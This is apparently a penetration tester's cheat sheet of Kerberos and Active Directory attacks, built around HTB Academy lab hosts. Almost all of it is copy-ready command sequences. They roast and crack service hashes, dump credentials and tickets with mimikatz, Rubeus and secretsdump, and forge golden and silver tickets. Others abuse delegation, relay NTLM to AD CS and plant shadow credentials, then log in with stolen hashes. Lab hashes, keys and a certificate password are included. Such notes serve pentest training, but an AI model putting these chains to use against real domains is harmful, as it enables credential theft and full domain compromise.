## Kerberos Attacks

Most "instant DA" stories in AD pentest reports trace back to Kerberos abuse. The protocol is heavy on assumptions — abuse those assumptions and you forge tickets, impersonate users, or pass DCs back and forth like keys.

---

### Quick Reminder of the Ticket Flow

```bash
Client --AS-REQ-->     KDC
Client <--TGT (AS-REP) KDC
Client --TGS-REQ-->    KDC          (presents TGT, names SPN)
Client <--ST (TGS-REP) KDC
Client --AP-REQ-->     Service      (presents ST)
```

`KRB5CCNAME` env var points at your current ticket cache:

```bash
export KRB5CCNAME=user.ccache
klist                                # show what tickets you hold
```

---

### ASREPRoasting

Target users with `DOES_NOT_REQUIRE_PREAUTH`. The KDC will hand out an AS-REP encrypted with the user's hash — crack offline.

```bash
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <DC_IP> | grep -i "user"
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Kerberoasting

Any authenticated domain user can request a TGS for any SPN. The TGS is encrypted with the *service account's* hash → crack offline.

```bash
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc-ip> -request -outputfile spns.txt
hashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt
```

Prioritize accounts with weak passwords (look at `pwdLastSet`, `description`, group membership).

### Pass-the-Ticket (PtT)

If you've captured a `.ccache` (export from a Linux shell) or a `.kirbi` (Windows / mimikatz), use it directly:

```bash
## Linux
export KRB5CCNAME=admin.ccache
impacket-secretsdump -no-pass -k <DC-FQDN>
```

```bash
## Mimikatz on Windows
kerberos::ptt admin.kirbi
```

### Constrained Delegation Abuse (S4U)

If an account has *Kerberos constrained delegation* (KCD) rights to a target SPN, you can use **S4U2Self + S4U2Proxy** to impersonate any user to that target service.

#### 1. Discover delegation rights

```bash
impacket-findDelegation <domain>/<user>:'<pass>' -dc-ip <dc-ip>
```

#### 2. Request a TGT for the low-priv account

```bash
impacket-getTGT <domain>/<user>:'<pass>' -dc-ip <dc-ip>
export KRB5CCNAME=<user>.ccache
```

#### 3. Request a Service Ticket impersonating Administrator

```bash
impacket-getST -k -spn <high-acct>/DC.<domain> -impersonate Administrator \
    <domain>/<user>:<pass>
export KRB5CCNAME=Administrator.ccache
```

#### 4. Use the ticket — dump every hash

```bash
impacket-secretsdump -no-pass -k DC.<domain>
```

#### 5. Pivot with the dumped hash

```bash
impacket-psexec <domain>/<acct>@<ip> -hashes :<NTLM>
evil-winrm -i <ip> -u <acct> -H <NTLM>
```

### Unconstrained Delegation

Less common today, but devastating. A server with unconstrained delegation that you can RCE on will have inbound TGTs for *every* user that auths to it cached in LSASS — including DAs if you can coerce them. Workflow:

1. Pop a host with `TrustedForDelegation`.
2. Coerce a DC to authenticate (PrinterBug / PetitPotam / DFSCoerce).
3. Extract the DC's TGT from LSASS (mimikatz `sekurlsa::tickets /export`).
4. Pass-the-ticket → DCSync.

### Resource-Based Constrained Delegation (RBCD)

Set the `msDs-AllowedToActOnBehalfOfOtherIdentity` attribute on a target computer (requires `GenericAll` / `WriteProperty`) → use a controlled account to do S4U attacks against it.

```bash
## Add an attacker-controlled machine account
impacket-addcomputer -computer-name 'PWN$' -computer-pass 'P@ss123' \
    -dc-ip <dc-ip> <domain>/<user>:<pass>

## Set msDS-AllowedToActOnBehalfOfOtherIdentity on the target
impacket-rbcd -delegate-from 'PWN$' -delegate-to '<TargetComputer$>' \
    -dc-ip <dc-ip> -action write <domain>/<user>:<pass>

## Request a ticket as Administrator against the target's CIFS service
impacket-getST -spn cifs/<targetfqdn> -impersonate Administrator \
    <domain>/'PWN$':'P@ss123'

## Use it
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <domain>/Administrator@<targetfqdn>
```

### Golden Ticket

Forge a TGT using the `krbtgt` hash → "I am Administrator, signed by me."

```bash
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:<dom>.local /sid:<SID> /krbtgt:<NTLM> /id:500
misc::cmd
```

A golden ticket is valid for 10 years by default; only rotating `krbtgt` *twice* invalidates it.

### Silver Ticket

Forge a Service Ticket for one specific service using that service's hash. Stealthier — no KDC traffic.

```bash
kerberos::golden /user:Administrator /domain:<dom>.local /sid:<SID> \
    /target:<svc-host> /service:<svc> /rc4:<svc-acct-NTLM> /id:500 /ptt
```

### Harvesting Tickets

#### Rubeus (preferred — no admin required)

```bash
Rubeus.exe dump /nowrap
```

Take the ticket whose service is `krbtgt` for the user you want — that's their TGT.

#### Mimikatz (needs local admin)

```bash
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```

### OverPass-the-Hash (forge a TGT from a hash)

> Prefer AES keys over NTLM/RC4 — modern Windows flags RC4 tickets as legacy and may trigger detections.

Pull the keys for the user you want to impersonate:

```bash
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```

#### Use the RC4 hash (admin required) — opens cmd as the user

```bash
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext \
    /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

#### Use the AES256 key (no admin) — request a TGT with Rubeus

```bash
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext \
    /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

### Pass-the-Ticket — Windows

Submit a ticket into the current session:

```bash
## Rubeus — request and inject in one step
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext \
    /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt

## Rubeus — inject an exported .kirbi
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

## Mimikatz — inject an exported .kirbi
mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;...]@krbtgt-inlanefreight.htb.kirbi"
```

#### PowerShell Remoting (5985/5986) Pivot

Once a ticket is loaded for a user in `Remote Management Users`:

```bash
exit                           # leave mimikatz / Rubeus shell
powershell
Enter-PSSession -ComputerName DC01
```

Rubeus variant that doesn't need admin:

```bash
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
## In the new window
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb \
    /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
Enter-PSSession -ComputerName DC01
```

### Pass-the-Ticket — Linux

Useful when the Linux host is domain-joined and holds keytabs or ccache files.

#### Check membership and find tickets

```bash
realm list                                       # domain-joined?
find / -name *.keytab* -ls 2>/dev/null
find / -name *.kt* -ls 2>/dev/null
crontab -l                                       # look for kinit calls
env | grep -i krb5                               # current ccache location
ls -la /tmp                                      # /tmp/krb5cc_*
```

#### Inspect a keytab and impersonate

```bash
klist -k -t /opt/specialfiles/carlos.keytab

kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist                                            # confirm principal changed

## Persist the ticket
export KRB5CCNAME=/tmp/krb5cc_647401106_I8I133
```

#### Extract hashes from a keytab

```bash
git clone https://github.com/sosdave/KeyTabExtract
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

#### Use the ticket

```bash
id julio@inlanefreight.htb
smbclient //dc01/C$ -k -c ls --no-pass
```

#### ccache ↔ kirbi conversion

```bash
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
## then on Windows: Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

#### Linikatz (mimikatz-style sweep on Linux)

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh /opt/linikatz.sh
```

> Kerberos talks to **domain names**, not IPs — `/etc/hosts` and `/etc/krb5.conf` must be configured correctly. See the Shadow Credentials section below for a working `krb5.conf` template.

### Pass-the-Certificate (AD CS)

If a CA template is misconfigured (ESC1/8) or the machine account can request a certificate, you can chain an NTLM relay → certificate → TGT.

#### 1. Start the relay against AD CS

```bash
sudo impacket-ntlmrelayx \
    -t http://10.129.234.110/certsrv/certfnsh.asp \
    --adcs -smb2support \
    --template KerberosAuthentication
```

#### 2. Coerce a machine account to authenticate (printerbug)

- Repo: <https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py>

```bash
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:'<pass>'@10.129.234.109 <kali-ip>
```

The relay grabs a certificate for the coerced account.

#### 3. Use the cert to request a TGT (PKINITtools)

```bash
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv && source .venv/bin/activate
pip3 install -r requirements.txt --break-system-packages
pip3 install -I git+https://github.com/wbond/oscrypto.git --break-system-packages

python3 gettgtpkinit.py -cert-pfx <cert.pfx> -dc-ip 10.129.234.109 \
    'inlanefreight.local/dc01$' /tmp/dc.ccache
```

#### 4. Dump the hash with that TGT

```bash
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 \
    -just-dc-user Administrator \
    'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

#### 5. Use the hash with evil-winrm

```bash
evil-winrm -i 10.129.14.207 -u Administrator -H fd02e525dd676fd8ca04e200d265f20c
```

### Shadow Credentials (`msDS-KeyCredentialLink`)

Exploits the `AddKeyCredentialLink` edge that BloodHound surfaces — you add a key credential to the target and then auth via PKINIT.

#### 1. Add the key with pywhisker

- Repo: <https://github.com/ShutdownRepo/pywhisker>

```bash
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'pass' \
    --target jpinkman --action add
```

#### 2. Use the generated PFX to request a TGT

```bash
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx \
    -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' \
    -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

export KRB5CCNAME=/tmp/jpinkman.ccache
```

#### 3. WinRM as the impersonated user (if in Remote Management Users)

Get the DC's FQDN and put it in `/etc/hosts`:

```bash
netexec smb <dc-ip>
echo "10.129.234.109 dc01.inlanefreight.local dc01" | sudo tee -a /etc/hosts
```

Working `/etc/krb5.conf`:

```bash
[libdefaults]
    default_realm = INLANEFREIGHT.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = true
    forwardable = true

[realms]
INLANEFREIGHT.LOCAL = {
    kdc = dc01.inlanefreight.local
    admin_server = dc01.inlanefreight.local
}

[domain_realm]
.inlanefreight.local = INLANEFREIGHT.LOCAL
 inlanefreight.local = INLANEFREIGHT.LOCAL
```

Connect:

```bash
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

### Reference

- Harmj0y's AD ACL cheatsheet: <https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993>
- Impacket toolkit: <https://github.com/fortra/impacket>
- Password Attacks walkthrough (great for AES engagement): <https://medium.com/@moustafaabdelmaksoud/password-attacks-skill-assessment-htb-academy-39b1f52e9010>
